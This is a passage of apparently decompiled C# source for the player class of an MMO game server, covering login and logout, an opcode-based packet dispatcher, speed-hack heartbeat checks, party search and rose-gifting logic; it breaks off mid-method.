using DNGuard;
using RxjhServer.DbClss;
using RxjhServer.HelperTools;
using RxjhServer.Network;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Timers;

namespace RxjhServer
{
	public class Players : PlayersBes, IDisposable
	{
		private int idd = 10464;

		private int 元宝个人商店是否开通 = 1;

		private Dictionary<int, HcItimesClass> 合成物品表 = new Dictionary<int, HcItimesClass>();

		public DateTime 狮子吼time = DateTime.Now;

		public DateTime 发送消息time = DateTime.Now;

		private DateTime 移动时间 = DateTime.Now;

		private DateTime 打坐时间 = DateTime.Now;

		public DateTime Pktime801303 = DateTime.Now;

		public DateTime Pktime801202 = DateTime.Now;

		public DateTime Pktime801301 = DateTime.Now;

		public int Pk武功ID = -1;

		private List<武功类> 武功l = new List<武功类>();

		private DateTime 捡物时间 = DateTime.Now;

		private DateTime 开箱时间 = DateTime.Now;

		private DateTime 吃药时间 = DateTime.Now;

		private DateTime 情侣移动time = DateTime.Now;

		private DateTime 传书时间 = DateTime.Now;

		public DateTime 攻击时间检查 = DateTime.Now;

		public System.Timers.Timer 自动坐标;

		private ThreadSafeDictionary<int, Players> PlayList;

		private MissionClass Mission;

		public int 外挂提示次数;

		public DateTime Pktime;

		public DateTime 攻击时间;

		private bool disposed;

		private bool 人物是否登陆;

		private bool 连接成功;

		public int PkID;

		public DateTime XTtime;

		public int times;

		public int 攻击确认时间;

		public int 石头剪子布赢次数;

		public System.Timers.Timer 预备申请仪式计时器;

		private DateTime 预备时间;

		public int 婚礼地图;

		public int 婚礼入场券;

		public int 婚礼模式;

		private int 名包宠物类型;

		private long 名包宠物id;

		public DateTime 使用大土time;

		public int 元宝合成开关;

		private int 合成手续费;

		private float 上次坐标X;

		private float 上次坐标Y;

		private int yxsl;

		public int 物理攻击人物ID;

		public System.Timers.Timer 自动攻击;

		public System.Timers.Timer 自动恢复;

		private byte[] 解锁包;

		private int 解锁数量;

		public int 怒气;

		public int 怒点;

		public DateTime 切换PKtime;

		private List<武功类> 武功类List = new List<武功类>();

		public int 超负荷等级;

		public int 神女虚弱ID;

		public bool 人物移动中;

		public int 当前攻击时间间隔 = 1000;

		public int 上次攻击人物ID;

		public int 连续攻击怪物次数;

		public int 攻击确认次数;

		public int 引怪次数;

		public int 判断是否用封包登陆;

		public Players(NetState client)
			: base(client)
		{
			Mission = new MissionClass(this);
			PlayList = new ThreadSafeDictionary<int, Players>();
			XTtime = DateTime.Now;
			切换PKtime = DateTime.Now;
			使用大土time = DateTime.Now;
			外挂提示次数 = 0;
			times = 0;
			攻击确认时间 = 0;
			Pktime = DateTime.Now;
			攻击时间 = DateTime.Now;
			超负荷等级 = 0;
			神女虚弱ID = 0;
			人物移动中 = false;
			引怪次数 = 0;
		}

		~Players()
		{
			Dispose(false);
		}

		public void Dispose()
		{
			try
			{
				if (查坐标 != null)
				{
					查坐标.Enabled = false;
					查坐标.Close();
					查坐标.Dispose();
					查坐标 = null;
				}
				if (allChars != null)
				{
					allChars.Clear();
				}
				if (攻击列表 != null)
				{
					攻击列表.Clear();
				}
				if (新武功连击 != null)
				{
					新武功连击.Clear();
				}
				if (个人商店 != null)
				{
					个人商店 = null;
				}
				if (交易 != null)
				{
					交易 = null;
				}
				if (玉连环 != null)
				{
					玉连环.Clear();
				}
				if (得到门徽ID != null)
				{
					得到门徽ID.Clear();
					得到门徽ID = null;
				}
				if (PlayList != null)
				{
					PlayList.Clear();
					PlayList.Dispose();
					PlayList = null;
				}
				if (SerList != null)
				{
					SerList.Clear();
				}
				if (NpcList != null)
				{
					if (NpcList.Count > 0)
					{
						foreach (NpcClass value in NpcList.Values)
						{
							value.PlayList_Remove(this);
						}
					}
					NpcList.Clear();
					NpcList.Dispose();
					NpcList = null;
				}
				if (地面物品列表 != null)
				{
					地面物品列表.Clear();
					地面物品列表.Dispose();
					地面物品列表 = null;
				}
				if (追加状态列表 != null)
				{
					追加状态列表.Clear();
					追加状态列表.Dispose();
					追加状态列表 = null;
				}
				if (追加状态New列表 != null)
				{
					追加状态New列表.Clear();
					追加状态New列表.Dispose();
					追加状态New列表 = null;
				}
				if (异常状态 != null)
				{
					异常状态.Clear();
					异常状态.Dispose();
					异常状态 = null;
				}
				if (神女异常状态 != null)
				{
					神女异常状态.Clear();
					神女异常状态.Dispose();
					神女异常状态 = null;
				}
				if (异常防御状态 != null)
				{
					异常防御状态.Clear();
					异常防御状态.Dispose();
					异常防御状态 = null;
				}
				if (异常攻击状态 != null)
				{
					异常攻击状态.Clear();
					异常攻击状态.Dispose();
					异常攻击状态 = null;
				}
				if (异常掉蓝状态 != null)
				{
					异常掉蓝状态.Clear();
					异常掉蓝状态.Dispose();
					异常掉蓝状态 = null;
				}
				if (异常掉血状态 != null)
				{
					异常掉血状态.Clear();
					异常掉血状态.Dispose();
					异常掉血状态 = null;
				}
				if (自动攻击 != null)
				{
					自动攻击.Enabled = false;
					自动攻击.Close();
					自动攻击.Dispose();
					自动攻击 = null;
				}
				if (合成物品表 != null)
				{
					合成物品表.Clear();
					合成物品表 = null;
				}
				if (人物灵兽 != null)
				{
					清空灵兽状态();
				}
				if (任务 != null)
				{
					任务.Clear();
					任务 = null;
				}
				if (公有药品 != null)
				{
					公有药品.Clear();
					公有药品 = null;
				}
				if (升天气功 != null)
				{
					升天气功.Clear();
					升天气功 = null;
				}
				if (传书列表 != null)
				{
					传书列表.Clear();
					传书列表 = null;
				}
				if (tem != null)
				{
					tem.Clear();
					tem = null;
				}
				if (自动恢复 != null)
				{
					自动恢复.Enabled = false;
					自动恢复.Close();
					自动恢复.Dispose();
					自动恢复 = null;
					自动恢复 = null;
				}
				if (预备申请仪式计时器 != null)
				{
					预备申请仪式计时器.Enabled = false;
					预备申请仪式计时器.Close();
					预备申请仪式计时器.Dispose();
					预备申请仪式计时器 = null;
				}
				if (Mission != null)
				{
					Mission.Dispose();
					Mission = null;
				}
				disposed = true;
				if (移动地图计时器 != null)
				{
					移动地图计时器.Enabled = false;
					移动地图计时器.Close();
					移动地图计时器.Dispose();
					移动地图计时器 = null;
				}
				if (无敌时间计数器 != null)
				{
					无敌时间计数器.Enabled = false;
					无敌时间计数器.Close();
					无敌时间计数器.Dispose();
					无敌时间计数器 = null;
				}
				if (障力恢复时间计数器 != null)
				{
					障力恢复时间计数器.Enabled = false;
					障力恢复时间计数器.Close();
					障力恢复时间计数器.Dispose();
					障力恢复时间计数器 = null;
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "用户数据释放_Dispose()出错[" + ex.Message + "]");
			}
		}

		private void Dispose(bool disposing)
		{
			if (disposed)
			{
			}
			disposed = true;
		}

		public bool Logoin()
		{
			bool result = false;
			try
			{
				World.allConnectedChars.Add(base.人物全服ID, this);
				Form1.WriteLine(3, "人物登陆[" + base.Userid + "]-[" + base.UserName + "]");
				查坐标 = new System.Timers.Timer(6000.0);
				查坐标.Elapsed += MoveAll;
				查坐标.AutoReset = true;
				查坐标.Enabled = true;
				RxjhClass.登陆记录(base.Userid, base.UserName, base.Client.ToString(), "登陆");
				result = true;
				人物是否登陆 = true;
				return result;
			}
			catch (Exception ex)
			{
				base.Client.Dispose();
				Form1.WriteLine(100, "Logoin()出错![" + base.Userid + "]-[" + base.UserName + "][" + base.人物全服ID + "]" + ex.ToString());
				return result;
			}
		}

		public void 切换PK模式(int PK)
		{
			byte[] array = Converter.hexStringToByte("AA550800930416100200020055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(PK), 0, array, 10, 1);
			base.人物PK模式 = PK;
			心跳次数阀值 = 3;
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void Logout()
		{
			int num = 0;
			try
			{
				if (连接成功)
				{
					Players value;
					if (World.allConnectedChars.TryGetValue(base.人物全服ID, out value))
					{
						RxjhClass.登陆记录(base.Userid, base.UserName, base.Client.ToString(), "登出");
						if (base.人物坐标_地图 == 801 && World.当前是否是银币线路 == 1)
						{
							World.conn.发送("势力战掉线|" + base.UserName + "|" + base.势力战派别);
							if (string.Compare(base.势力战派别, "仙族") == 0)
							{
								if (World.势力战正人数 > 0)
								{
									World.势力战正人数--;
								}
							}
							else if (string.Compare(base.势力战派别, "魔族") == 0 && World.势力战邪人数 > 0)
							{
								World.势力战邪人数--;
							}
							World.conn.发送("势力战人数|" + World.势力战正人数 + "|" + World.势力战邪人数);
						}
						bool flag = false;
						foreach (坐标Class item in World.移动)
						{
							if (item.Rxjh_Map == base.人物坐标_地图)
							{
								flag = true;
								break;
							}
						}
						if (!flag)
						{
							base.人物坐标_地图 = 101;
							base.人物坐标_X = 575f;
							base.人物坐标_Y = 1565f;
						}
						if (base.人物坐标_地图 != 7001)
						{
							if (base.人物坐标_地图 == 7101)
							{
								if (World.血战 != null && World.血战.结束 == 0)
								{
									if (World.血战.帮战主方.申请帮派ID == base.帮派Id)
									{
										if (World.血战.帮战主方.申请人物列表.ContainsKey(base.人物全服ID))
										{
											if (base.帮派人物等级 == 6)
											{
												World.血战.主方分数 = 0;
												World.血战.客方分数 = 0;
												World.血战.结束 = 2;
												World.血战.Dispose();
											}
											else
											{
												World.血战.主方分数--;
												World.血战.帮战主方.申请人物列表.Remove(base.人物全服ID);
											}
											关起来 = 0;
											帮战开始提示(1, 0);
										}
									}
									else if (World.血战.帮战客方.申请帮派ID == base.帮派Id && World.血战.帮战客方.申请人物列表.ContainsKey(base.人物全服ID))
									{
										if (base.帮派人物等级 == 6)
										{
											World.血战.主方分数 = 0;
											World.血战.客方分数 = 0;
											World.血战.结束 = 2;
											World.血战.Dispose();
										}
										else
										{
											World.血战.客方分数--;
											World.血战.帮战客方.申请人物列表.Remove(base.人物全服ID);
										}
										关起来 = 0;
										帮战开始提示(1, 0);
									}
								}
								移动(529f, 1528f, 15f, 101);
							}
							else if (base.人物坐标_地图 == 7301 && World.帮战 != null)
							{
								移动(415f, 1528f, 15f, 101);
								帮战开始提示(0, 0);
							}
						}
						World.allConnectedChars.Remove(base.人物全服ID);
						保存人物数据存储过程();
						保存个人仓库存储过程();
						保存综合仓库存储过程();
						if (base.FLD_情侣.Length != 0)
						{
							Players players = World.检查玩家name(base.FLD_情侣);
							if (players != null)
							{
								players.更新情侣系统(1, base.UserName, players.婚戒刻字, players.解除关系倒计时, DateTime.Now);
							}
						}
						num = 1;
						清空追加状态New列表();
						num = 111;
						清空追加状态列表();
						num = 1112;
						异常状态列表();
						num = 2;
						离开当前地图();
						num = 3;
						组队Class value2;
						if (组队id != 0 && World.W组队.TryGetValue(组队id, out value2))
						{
							value2.退出(this, 1);
						}
						num = 4;
						if (个人商店 != null && 个人商店.个人商店是否开启)
						{
							if (个人商店.商店类型 == 1)
							{
								关店();
							}
							else if (个人商店.商店类型 == 2)
							{
								元宝个人商店关店();
							}
						}
						num = 5;
						if (进店中 && 进店中ID != 0)
						{
							Players players2 = 得到人物数据(进店中ID);
							if (players2 != null && players2.个人商店 != null)
							{
								if (players2.个人商店.商店类型 == 1)
								{
									出店(进店中ID);
								}
								else if (players2.个人商店.商店类型 == 2)
								{
									元宝个人商店出店(进店中ID);
								}
							}
						}
						num = 6;
						if (人物灵兽 != null)
						{
							清空灵兽状态();
						}
						num = 7;
						if (交易 != null && 交易.交易中)
						{
							关闭交易(0, 6);
						}
						num = 8;
						Form1.WriteLine(3, "人物退出[" + base.Userid + "]-[" + base.UserName + "]");
					}
					else
					{
						Form1.WriteLine(3, "人物退出2[" + base.Userid + "]-[" + base.UserName + "]");
					}
					num = 8;
					if (查坐标 != null)
					{
						查坐标.Enabled = false;
						查坐标.Close();
						查坐标.Dispose();
						查坐标 = null;
					}
					if (自动坐标 != null)
					{
						自动坐标.Enabled = false;
						自动坐标.Close();
						自动坐标.Dispose();
						自动坐标 = null;
					}
					num = 9;
					num = 10;
					if (快捷栏 != null)
					{
						快捷栏.Clear();
					}
					num = 11;
					if (自动恢复 != null)
					{
						自动恢复.Enabled = false;
						自动恢复.Close();
						自动恢复.Dispose();
						自动恢复 = null;
					}
					if (自动攻击 != null)
					{
						自动攻击.Enabled = false;
						自动攻击.Close();
						自动攻击.Dispose();
						自动攻击 = null;
					}
					if (移动地图计时器 != null)
					{
						移动地图计时器.Enabled = false;
						移动地图计时器.Close();
						移动地图计时器.Dispose();
					}
					if (无敌时间计数器 != null)
					{
						无敌时间计数器.Enabled = false;
						无敌时间计数器.Close();
						无敌时间计数器.Dispose();
					}
					if (障力恢复时间计数器 != null)
					{
						障力恢复时间计数器.Enabled = false;
						障力恢复时间计数器.Close();
						障力恢复时间计数器.Dispose();
						障力恢复时间计数器 = null;
						if (SerList != null)
						{
							SerList.Clear();
						}
					}
				}
			}
			catch (Exception ex)
			{
				World.allConnectedChars.Remove(base.人物全服ID);
				Form1.WriteLine(100, "出错!Logout用户[" + base.Userid + "]-[" + base.UserName + "]      Logout()      出错ID" + num + "      " + ex.Message);
			}
		}

		public void 异常状态列表()
		{
			if (异常状态 != null && 异常状态.Count != 0)
			{
				try
				{
					foreach (异常状态类 value in 异常状态.Values)
					{
						value.时间结束事件();
						异常状态.Remove(value.FLD_PID);
					}
				}
				catch (Exception ex)
				{
					Form1.WriteLine(1, "异常状态列表列表出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
				}
			}
		}

		public void 清空追加状态New列表()
		{
			if (追加状态New列表 != null && 追加状态New列表.Count != 0)
			{
				try
				{
					foreach (追加状态New类 value in 追加状态New列表.Values)
					{
						追加状态New列表.Remove(value.FLD_PID);
						value.时间结束事件();
						value.Dispose();
					}
				}
				catch (Exception ex)
				{
					Form1.WriteLine(1, "追加状态New列表出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
				}
			}
		}

		public void 清空追加状态列表()
		{
			if (追加状态列表 != null && 追加状态列表.Count != 0)
			{
				Queue queue = Queue.Synchronized(new Queue());
				try
				{
					foreach (追加状态类 value in 追加状态列表.Values)
					{
						queue.Enqueue(value);
					}
					while (queue.Count > 0)
					{
						追加状态类 追加状态类 = (追加状态类)queue.Dequeue();
						追加状态列表.Remove(追加状态类.FLD_PID);
						追加状态类.时间结束事件();
						追加状态类.Dispose();
					}
				}
				catch (Exception ex)
				{
					Form1.WriteLine(1, "清空追加状态列表出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
				}
			}
		}

		public void 清空列表()
		{
			try
			{
				if (PlayList != null)
				{
					foreach (Players value in PlayList.Values)
					{
						value.PlayList.Remove(base.人物全服ID);
					}
					PlayList.Clear();
				}
				if (NpcList != null)
				{
					foreach (NpcClass value2 in NpcList.Values)
					{
						if (value2.Contains(this))
						{
							value2.PlayList_Remove(this);
						}
					}
					NpcList.Clear();
				}
				if (地面物品列表 != null)
				{
					foreach (地面物品类 value3 in 地面物品列表.Values)
					{
						value3.PlayList.Remove(base.人物全服ID);
					}
					地面物品列表.Clear();
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "清空列表出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public override void 发送当前范围广播数据(发包类 pak, int id, int wordid)
		{
			try
			{
				if (PlayList != null && PlayList.Count != 0)
				{
					foreach (Players value in PlayList.Values)
					{
						if (!value.Client.挂机 && value.Client != null && value.Client.Running)
						{
							value.Client.SendPak(pak, id, wordid);
						}
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "发送当前范围广播数据出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public override void 发送当前范围广播数据(byte[] data, int length)
		{
			try
			{
				if (PlayList != null && PlayList.Count != 0)
				{
					foreach (Players value in PlayList.Values)
					{
						if (!value.Client.挂机 && value.Client != null && value.Client.Running)
						{
							value.Client.Send(data, length);
						}
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "发送当前范围广播数据出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 发送当前范围广播数据多包(byte[] data, int length)
		{
			try
			{
				if (PlayList != null && PlayList.Count != 0)
				{
					foreach (Players value in PlayList.Values)
					{
						if (!value.Client.挂机 && value.Client != null && value.Client.Running)
						{
							value.Client.Send多包(data, length);
						}
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "发送当前范围广播数据出错多包![" + base.Userid + "]-[" + base.UserName + "]" + ((ex != null) ? ex.ToString() : null));
			}
		}

		public void 心跳检测(byte[] 封包数据, int 封包大小)
		{
			try
			{
				if (World.心跳检测开关 == 1)
				{
					if ((int)DateTime.Now.Subtract(XTtime).TotalMilliseconds < World.心跳检测时间阀值)
					{
						times++;
						if (times > 心跳次数阀值)
						{
							系统提示("游戏运行速度异常，请切换线路或关闭加速器。", 6, "系统提示");
							base.Client.Dispose();
						}
					}
					XTtime = DateTime.Now;
				}
			}
			catch
			{
			}
		}

		public void 验证ID登陆(byte[] 封包数据, int 封包大小)
		{
			byte[] array = Converter.hexStringToByte("AA552800C70345031A00010001007761746572696E676100000000000000000000000000000000000000000055AA");
			System.Buffer.BlockCopy(封包数据, 14, array, 14, 12);
			System.Buffer.BlockCopy(Buffer.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void unkown(byte[] data, int length)
		{
			byte[] array = Converter.hexStringToByte("AA551600BF05391608007714560401000000000000000000CAC755AA");
			System.Buffer.BlockCopy(Buffer.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send单包(array, array.Length);
			}
		}

		public void ManagePacket(byte[] data, int length)
		{
			int num = BitConverter.ToInt16(data, 6);
			try
			{
				Players value;
				if (!World.allConnectedChars.TryGetValue(base.人物全服ID, out value))
				{
					switch (num)
					{
					case 20:
						创建人物(data, length);
						break;
					case 16:
						获取人物列表(data, length);
						break;
					case 1:
						连接登陆(data, length);
						break;
					case 3:
						退出(data, length);
						break;
					case 5:
						人物登陆(data, length);
						break;
					case 143:
						显示();
						break;
					case 56:
						检查人物是否存在(data, length);
						break;
					case 30:
						删除人物(data, length);
						break;
					case 836:
						验证ID登陆(data, length);
						break;
					case 218:
						换线验证(data, length);
						break;
					case 211:
						换线验证(data, length);
						break;
					case 16666:
						ls攻击确认(data, length);
						break;
					case 5638:
					case 8212:
						版本验证(data, length);
						break;
					}
				}
				else
				{
					switch (num)
					{
					case 14:
						扔物品(data, length);
						break;
					case 3:
						退出(data, length);
						break;
					case 7:
						人物移动(data, length);
						break;
					case 8:
						说话(data, length);
						break;
					case 9:
					{
						int num2 = 攻击确认时间 = (int)DateTime.Now.Subtract(攻击时间).TotalMilliseconds;
						攻击(data, length);
						break;
					}
					case 11:
						捡物品(data, length);
						break;
					case 26:
						更换装备(data, length);
						break;
					case 22:
						更新配置(data, length);
						break;
					case 16:
						获取人物列表(data, length);
						break;
					case 40:
						队长管理(data, length);
						break;
					case 36:
						动作表情(data, length);
						break;
					case 67:
						加气功点(data, length);
						break;
					case 48:
						发送组队(data, length);
						break;
					case 50:
						本人取消组队(data, length);
						break;
					case 52:
						对方取消组队(data, length);
						break;
					case 54:
						退出组队(data, length);
						break;
					case 56:
						检查人物是否存在(data, length);
						break;
					case 58:
						打开物品(data, length);
						break;
					case 60:
						轻功(data, length);
						break;
					case 42:
						组队道具分配规则(data, length);
						break;
					case 72:
						死亡回城(data, length);
						break;
					case 69:
						学习技能包(data, length);
						break;
					case 131:
						任务系统(data, length);
						break;
					case 86:
						退回到人物列表(data, length);
						break;
					case 80:
						合成系统(data, length);
						break;
					case 176:
						心跳检测(data, length);
						break;
					case 177:
					case 178:
						查看传书(data, length);
						break;
					case 179:
						发送传书(data, length);
						break;
					case 181:
						阅读传书(data, length);
						break;
					case 143:
						显示();
						break;
					case 144:
						打开商店(data, length);
						break;
					case 146:
						买卖东西(data, length);
						break;
					case 148:
						仓库存取(data, length);
						break;
					case 151:
						交易大类(data, length);
						break;
					case 153:
						交易放东西(data, length);
						break;
					case 203:
						开店(data, length);
						break;
					case 194:
						技能连击2(data, length);
						break;
					case 196:
						魔法不足提示();
						break;
					case 197:
						轻功(data, length);
						break;
					case 199:
						技能连击(data, length);
						break;
					case 189:
						仓库药店(data, length);
						break;
					case 209:
						Npc传送(data, length);
						break;
					case 206:
						进店(data, length);
						break;
					case 321:
						登记玉连环(data, length);
						break;
					case 222:
						装备加解锁(data, length);
						break;
					case 225:
						穿针引线(data, length);
						break;
					case 227:
						创建门派确认(data, length);
						break;
					case 229:
						创建门派(data, length);
						break;
					case 231:
						加入门派(data, length);
						break;
					case 232:
						查帮派();
						break;
					case 234:
						得到门徽(data, length);
						break;
					case 236:
						申请门徽(data, length);
						break;
					case 238:
						赋予职位(data, length);
						break;
					case 212:
						百宝(data, length);
						break;
					case 345:
						打开荣誉殿堂(data, length);
						break;
					case 342:
						领取门派财产(data, length);
						break;
					case 774:
						打开玫瑰排行(data, length);
						break;
					case 772:
						赠送玫瑰(data, length);
						break;
					case 401:
						更新荣誉(data, length);
						break;
					case 1217:
						天魔神宫排行(data, length);
						break;
					case 789:
						荣誉排行前三名(data, length);
						break;
					case 1268:
						学习神女技能(data, length);
						break;
					case 1247:
						标志表情(data, length);
						break;
					case 1225:
						天魔神宫信息(data, length);
						break;
					case 4108:
						保存土灵符(data, length);
						break;
					case 4110:
						删除土灵符(data, length);
						break;
					case 4112:
						染发(data, length);
						break;
					case 4101:
						使用土灵符(data, length);
						break;
					case 4097:
						长白丹(data, length);
						break;
					case 4147:
						移动修炼之地(data, length);
						break;
					case 4145:
						修改帮派公告(data, length);
						break;
					case 4115:
						打开符(data, length);
						break;
					case 4117:
						PK开关(data, length);
						break;
					case 4119:
						放到快捷栏(data, length);
						break;
					case 4156:
						申请帮战(data, length);
						break;
					case 4154:
						取消帮战(data, length);
						break;
					case 4180:
						宠物动作包(data, length);
						break;
					case 4176:
						召唤宠物(data, length);
						break;
					case 4160:
						师徒系统(data, length);
						break;
					case 4162:
						师徒系统请求(data, length);
						break;
					case 4164:
						师徒系统取消(data, length);
						break;
					case 4166:
						师徒系统解除(data, length);
						break;
					case 4168:
						师徒传授武功(data, length);
						break;
					case 4186:
						灵兽变身(data, length);
						break;
					case 4182:
						宠物起名包(data, length);
						break;
					case 5441:
						变更门服(data, length);
						break;
					case 4232:
						选取怪物封包(data, length);
						break;
					case 4192:
						师徒武功检查(data, length);
						break;
					case 5648:
						组队传送(data, length);
						break;
					case 5639:
						美发(data, length);
						break;
					case 5724:
						辅助装备切换(data, length);
						break;
					case 5680:
						帮派传送(data, length);
						break;
					case 5654:
						换人物名(data, length);
						break;
					case 5920:
						元宝合成(data, length);
						break;
					case 5922:
						元宝合成2(data, length);
						break;
					case 5924:
						死亡回城(data, length);
						break;
					case 5914:
						制药系统(data, length);
						break;
					case 5954:
						删除制作技术(data, length);
						break;
					case 5952:
						制作系统动作(data, length);
						break;
					case 5936:
						制作分解系统(data, length);
						break;
					case 5938:
						制作分解检查(data, length);
						break;
					case 5941:
						制作系统制作(data, length);
						break;
					case 5943:
						制作系统检查(data, length);
						break;
					case 5944:
						学习制作技能(data, length);
						break;
					case 5946:
						分配门派武勋(data, length);
						break;
					case 5971:
						采药(data, length);
						break;
					case 5968:
						潜行(data, length);
						break;
					case 6009:
						情侣系统(data, length);
						break;
					case 6003:
						石头剪子布(data, length);
						break;
					case 6000:
						名字样式(data, length);
						break;
					case 6150:
						加升天武功点(data, length);
						break;
					case 6144:
						搜索组队(data, length);
						break;
					case 6433:
						设置副本难度(data, length);
						break;
					case 6418:
						查看装备(data, length);
						break;
					case 6402:
						道具组合(data, length);
						break;
					case 7179:
						元宝个人商店(data, length);
						break;
					case 6435:
						查看气功(data, length);
						break;
					case 7195:
						元宝个人商店查询协议开通(data, length);
						break;
					case 7194:
						元宝个人商店查询协议(data, length);
						break;
					case 7181:
						进元宝个人商店(data, length);
						break;
					case 12580:
						装备修理(data, length);
						break;
					case 12403:
						打开换名符(data, length);
						break;
					case 8724:
						势力战系统(data, length);
						break;
					case 20760:
						天魔回城(data, length);
						break;
					case 20742:
						天魔神宫邀请(data, length);
						break;
					case 20740:
						天魔神宫邀请银币(data, length);
						break;
					}
					if (num != 7)
					{
						人物移动中 = false;
					}
				}
			}
			catch (Exception ex)
			{
				string[] obj = new string[8]
				{
					"ManagePacket()出错",
					base.Client.WorldId.ToString(),
					"|",
					base.Client.ToString(),
					" ",
					num.ToString(),
					"    ",
					null
				};
				obj[7] = ((ex != null) ? ex.ToString() : null);
				Form1.WriteLine(1, string.Concat(obj));
				Console.WriteLine(ex);
				base.Client.Dispose();
			}
		}

		public void 标志表情(byte[] 封包数据, int 封包大小)
		{
			byte[] array = new byte[4];
			System.Buffer.BlockCopy(封包数据, 14, array, 0, 4);
			标志表情(World.检查玩家世界ID(BitConverter.ToInt32(array, 0)), 封包数据[18]);
		}

		public void 标志表情(Players Play, int ID)
		{
			byte[] array = Converter.hexStringToByte("AA5512008100E0040C0081000000A30400000200000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(ID), 0, array, 18, 1);
			System.Buffer.BlockCopy(BitConverter.GetBytes(Play.人物全服ID), 0, array, 14, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			发送当前范围广播数据(array, array.Length);
		}

		public void 搜索组队(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				int num = 封包数据[10];
				Buffer.ToInt16(封包数据, 11);
				发包类 发包类 = new 发包类();
				发包类.Write2(World.W组队.Count);
				foreach (组队Class value in World.W组队.Values)
				{
					Players players = 得到人物数据(value.队长Name);
					发包类.Write4(0);
					发包类.Write2(0);
					发包类.Write1(players.Player_Zx);
					发包类.Write1(num + 10);
					发包类.WriteString(players.UserName, 15);
					发包类.Write1(value.队员列表.Count);
					发包类.Write4(0);
					发包类.Write4(players.人物坐标_地图);
					for (int i = 0; i < 10; i++)
					{
						发包类.Write8(0L);
					}
				}
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 280, base.人物全服ID);
				}
			}
			catch
			{
			}
		}

		public void 赠送玫瑰(Players 发送人, Players 接收人, int 玫瑰数量, string msg)
		{
			try
			{
				创建传书(发送人, 接收人.UserName, 0, msg, 3, 玫瑰数量);
			}
			catch
			{
			}
		}

		public void 赠送玫瑰(byte[] 封包数据, int lenght)
		{
			封包修改(封包数据, lenght);
			if (!FLD_是否可以送花)
			{
				系统提示("每次送花的间隔时间为" + World.挂机奖励时间周期 + "分钟。");
				return;
			}
			if (base.FLD_情侣.Length == 0)
			{
				系统提示("玫瑰花只属于有情人之间的礼物！");
				return;
			}
			if (解除关系倒计时 != 0)
			{
				情侣提示(53, base.UserName, base.FLD_情侣);
				return;
			}
			byte[] array = new byte[14];
			byte[] array2 = new byte[60];
			System.Buffer.BlockCopy(封包数据, 33, array2, 0, 60);
			System.Buffer.BlockCopy(封包数据, 11, array, 0, 14);
			string string_ = Encoding.Default.GetString(array).Replace("\0", string.Empty).Trim();
			string msg = Encoding.Default.GetString(array2).Replace("\0", string.Empty).Trim();
			int num = BitConverter.ToInt32(封包数据, 244);
			int num2 = 封包数据[252];
			Players players = 得到人物数据(string_);
			if (num == 0 || (num != 1008001382 && num != 1008001383 && num != 1008001384 && num != 1008001385) || 装备栏包裹[num2].Get物品ID != num || 装备栏包裹[num2].Get物品数量 <= 0)
			{
				return;
			}
			if (players != null)
			{
				if (base.FLD_情侣 != players.UserName)
				{
					系统提示("你送花给别人你爱人知道吗？");
					return;
				}
				FLD_是否可以送花 = false;
				int num3 = 0;
				switch (num)
				{
				case 1008001382:
					num3 = 9;
					break;
				case 1008001383:
					num3 = 99;
					break;
				case 1008001384:
					num3 = 999;
					break;
				case 1008001385:
					num3 = 9999;
					break;
				}
				int num4 = RNG.Next(10, 30);
				if (夫妻组队中)
				{
					num4 *= 2;
				}
				int num5 = num4 * num3;
				物品使用(1, num2, 1);
				更新玫瑰排行(this, players, num3);
				base.FLD_情侣_爱情度 += num5;
				players.FLD_情侣_爱情度 += num5;
				players.玫瑰称号积分 += num3;
				players.获得玫瑰称号属性();
				赠送玫瑰(this, players, num3, msg);
				if (num3 >= 999)
				{
					if ((DateTime.Now.Month == 2 && DateTime.Now.Day == 14) || (DateTime.Now.Month == 7 && DateTime.Now.Day == 7))
					{
						World.发送公告(base.UserName + "  向  " + players.UserName + "  送了" + num3 + "朵情人节玫瑰，好希望陪你一直到老，让你做我收心里的宝。情人节快乐！");
					}
					else
					{
						World.发送公告(base.UserName + "  向  " + players.UserName + "  送了" + num3 + "朵玫瑰，好希望陪你一直到老，让你做我收心里的宝。");
					}
				}
				if (base.FLD_情侣_爱情度 >= 35000)
				{
					base.FLD_情侣_爱情度 = 35000;
					FLD_爱情度等级 = 1;
				}
				else if (base.FLD_情侣_爱情度 > 30000)
				{
					if (FLD_爱情度等级 == 2)
					{
						情侣提示(27, base.UserName, players.UserName);
					}
					FLD_爱情度等级 = 1;
				}
				else if (base.FLD_情侣_爱情度 > 21000)
				{
					if (FLD_爱情度等级 == 3)
					{
						情侣提示(27, base.UserName, players.UserName);
					}
					FLD_爱情度等级 = 2;
				}
				else if (base.FLD_情侣_爱情度 > 14700)
				{
					if (FLD_爱情度等级 == 4)
					{
						情侣提示(27, base.UserName, players.UserName);
					}
					FLD_爱情度等级 = 3;
				}
				else if (base.FLD_情侣_爱情度 > 10290)
				{
					if (FLD_爱情度等级 == 5)
					{
						情侣提示(27, base.UserName, players.UserName);
					}
					FLD_爱情度等级 = 4;
				}
